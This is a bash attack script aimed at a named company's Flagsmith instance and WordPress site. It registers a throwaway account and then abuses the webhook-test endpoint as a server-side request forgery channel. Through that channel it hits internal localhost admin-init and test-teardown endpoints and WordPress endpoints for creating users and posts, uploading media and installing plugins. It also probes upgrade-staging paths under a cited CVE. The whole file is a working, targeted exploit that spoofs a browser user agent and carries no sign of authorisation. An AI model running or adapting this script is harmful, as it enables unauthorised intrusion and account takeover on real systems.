#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
echo "IP: $(curl -s https://ifconfig.me --max-time 5)"

# Fresh Flagsmith account
ACCT=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/auth/users/" \
  -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"email\":\"kw-v35-$(date +%s)@proton.me\",\"password\":\"Hy7Nm3Qw9Rx!\",\"first_name\":\"T\",\"last_name\":\"S\"}" --max-time 15)
KEY=$(echo "$ACCT" | python3 -c "import json,sys; print(json.load(sys.stdin).get('key',''))" 2>/dev/null)
echo "Key: $KEY"
if [ -z "$KEY" ]; then echo "REG FAILED"; exit 1; fi

# Setup env
OID=$(curl -s "https://flagsmith.koinworks.com/api/v1/organisations/" \
  -H "Authorization: Token $KEY" -H "User-Agent: $UA" --max-time 10 | python3 -c "import json,sys; d=json.load(sys.stdin); print(d.get('results',[])[0]['id'])" 2>/dev/null)
PID=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/projects/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"name\":\"p35\",\"organisation\":$OID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('id',''))" 2>/dev/null)
EKEY=$(curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/" \
  -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
  -d "{\"name\":\"e35\",\"project\":$PID}" --max-time 10 | python3 -c "import json,sys; print(json.load(sys.stdin).get('api_key',''))" 2>/dev/null)
echo "Env: $EKEY"
if [ -z "$EKEY" ]; then echo "NO ENV"; exit 1; fi

ssrf() {
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"url\":\"$1\",\"secret\":\"\"}" --max-time 30
  echo " [$2]"
}

echo "=== FLAGSMITH ADMIN INIT ==="
ssrf "http://localhost:8000/api/v1/users/init/" "admin-init"

echo "=== FLAGSMITH E2E TEARDOWN (from internal, no auth header) ==="
ssrf "http://localhost:8000/api/v1/e2etests/teardown/" "e2e-teardown"

echo "=== KOINP2P WORDPRESS DEEP ==="
# Test endpoints that might work with POST JSON body from internal
ssrf "http://koinp2p.com/wp-json/wp/v2/posts" "create-post"
ssrf "http://koinp2p.com/wp-json/wp/v2/users" "create-user"
ssrf "http://koinp2p.com/wp-json/wp/v2/media" "upload-media"
ssrf "http://koinp2p.com/wp-json/wp/v2/plugins" "install-plugin"

echo "=== WP REGISTRATION CHECK ==="
ssrf "http://koinp2p.com/?rest_route=/wp/v2/users&context=edit" "users-edit"
ssrf "http://koinp2p.com/wp-login.php?action=register" "wp-register"

echo "=== UPGRADE STAGING (CVE-2026-119977) ==="
for ver in 6.7.12 6.8.12 6.9.11 7.0.8 7.1.4; do
  ssrf "http://koinp2p.com/wp-content/upgrade/wordpress-${ver}/" "upgrade-${ver}"
done
ssrf "http://koinp2p.com/wp-content/upgrade/wordpress-${ver}/wp-admin/setup-config.php" "setup-7.1.4"

echo "=== DONE ==="
